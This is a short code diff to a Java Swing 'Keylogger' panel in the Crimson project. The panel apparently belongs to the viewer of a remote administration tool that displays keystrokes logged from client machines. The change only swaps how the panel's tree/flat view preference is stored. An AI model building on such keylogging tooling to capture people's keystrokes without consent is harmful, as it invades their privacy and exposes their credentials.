@@ -32,7 +32,7 @@ import com.subterranean_security.crimson.core.misc.EH;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.sv.keylogger.LogCallback;
 import com.subterranean_security.crimson.sv.profile.ClientProfile;
-import com.subterranean_security.crimson.viewer.ViewerStore;
+import com.subterranean_security.crimson.universal.stores.Database;
 import com.subterranean_security.crimson.viewer.ui.UIUtil;
 import com.subterranean_security.crimson.viewer.ui.common.components.Console;
 import com.subterranean_security.crimson.viewer.ui.common.panels.epanel.EPanel;
@@ -69,7 +69,7 @@ public class Keylogger extends JPanel implements CPPanel {
 	public Keylogger(ClientProfile profile, Console console) {
 		init(profile, console);
 		try {
-			flatView = ViewerStore.Databases.local.getBoolean("keylog.treeview");
+			flatView = Database.getFacility().getBoolean("keylog.treeview");
 		} catch (Exception e) {
 			EH.handle(e);
 		}
@@ -115,7 +115,7 @@ public class Keylogger extends JPanel implements CPPanel {
 			public void actionPerformed(ActionEvent arg0) {
 				logTree.refreshing = true;
 				flatView = !flatView;
-				ViewerStore.Databases.local.storeObject("keylog.treeview", flatView);
+				Database.getFacility().store("keylog.treeview", flatView);
 				if (flatView) {
 					btnView.setIcon(UIUtil.getIcon("icons16/general/tree_list.png"));
 					btnView.setToolTipText("Switch to flat view");
